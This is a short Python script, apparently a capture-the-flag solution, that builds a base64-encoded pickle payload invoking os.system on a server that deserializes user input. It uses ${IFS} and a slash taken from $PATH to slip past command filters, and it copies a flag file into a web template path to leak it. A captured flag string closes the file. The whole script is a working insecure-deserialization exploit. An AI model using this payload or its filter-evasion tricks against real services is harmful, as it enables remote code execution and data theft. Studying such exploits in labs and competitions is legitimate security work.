import base64

slash="`echo${IFS}${PATH}|cut${IFS}-c1-1`"
def get_payload(s):
    payload=(
        b'cos\nsystem\n'
        + b'('
        + b'X'+(len(s)).to_bytes(4,'little') + s.encode('utf-8')
        + b't'
        + b'R'
    )
    payload=base64.b64encode(payload)
    print("Command : %s" % s)
    print(payload.decode())


#get_payload("cat "+slash+"flag")

p1="S="+slash+";"
p1+="cat ${S}flag | tee ${S}app${S}temp?????${S}login?????"

get_payload(p1)
#W1{do_you_wanna_play_pickleball?_2e479a0253884f70d5de1a74d641d620}
